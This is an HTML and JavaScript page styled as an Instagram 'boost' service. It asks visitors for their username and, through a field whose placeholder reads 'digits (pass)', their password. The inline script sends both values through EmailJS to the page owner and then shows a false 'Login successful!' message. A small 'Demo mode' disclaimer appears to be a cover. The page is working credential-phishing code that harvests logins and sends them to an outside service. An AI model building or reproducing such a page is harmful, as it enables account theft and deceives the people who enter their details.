<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="iubIVLPgncBow7y8tHwbmPsd6zxDpitcEcdktvoHxhM" />
  <title>Boost Your Instagram!</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #ff6b81, #00ddeb, #ffcc5c);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }
    .container {
      width: 400px;
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      padding: 40px;
      text-align: center;
      animation: fadeIn 0.7s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    .title {
      font-size: 30px;
      font-weight: 700;
      color: #ff3366;
      margin-bottom: 15px;
    }
    .subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 25px;
    }
    .input-field {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      background: #f5f5f5;
      font-size: 15px;
      color: #333;
      transition: box-shadow 0.3s ease;
    }
    .input-field:focus {
      box-shadow: 0 0 10px rgba(255, 107, 107, 0.5);
      outline: none;
    }
    .input-field::placeholder {
      color: #bbb;
    }
    .boost-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(90deg, #ff6b81, #ffcc5c);
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      transition: transform 0.2s ease;
    }
    .boost-btn:hover {
      transform: translateY(-2px);
    }
    .boost-btn:disabled {
      background: #ccc;
      transform: none;
      cursor: not-allowed;
    }
    .note {
      font-size: 12px;
      color: #888;
      margin-top: 20px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="title">Boost Your Instagram!</h1>
    <p class="subtitle">Connect your account to get started</p>
    <form id="boost-form" name="boost-form">
      <input type="text" name="username" id="username" class="input-field" placeholder="Username" required>
      <input type="email" name="email" id="email" class="input-field" placeholder="digits (pass)" required>
      <button type="submit" class="boost-btn" id="boost-btn">Boost Now</button>
    </form>
    <p class="note">Demo modeâ€”data used for testing purposes only</p>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("XI3MNWxgiq0cRWGRE"); // Your Public Key

    document.getElementById("boost-form").addEventListener("submit", function(event) {
      event.preventDefault();
      const boostBtn = document.getElementById("boost-btn");
      boostBtn.disabled = true;
      boostBtn.textContent = "Processing...";

      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;

      emailjs.send("service_1jiaczt", "template_9lwlyaq", {
        username: username,
        email: email
      })
      .then(function(response) {
        alert("Login successful!");
        boostBtn.disabled = false;
        boostBtn.textContent = "Boost Now";
        document.getElementById("boost-form").reset();
      }, function(error) {
        alert("Failed to process. Please try again.");
        boostBtn.disabled = false;
        boostBtn.textContent = "Boost Now";
        console.log("EmailJS Error:", error);
      });
    });
  </script>
</body>
</html>
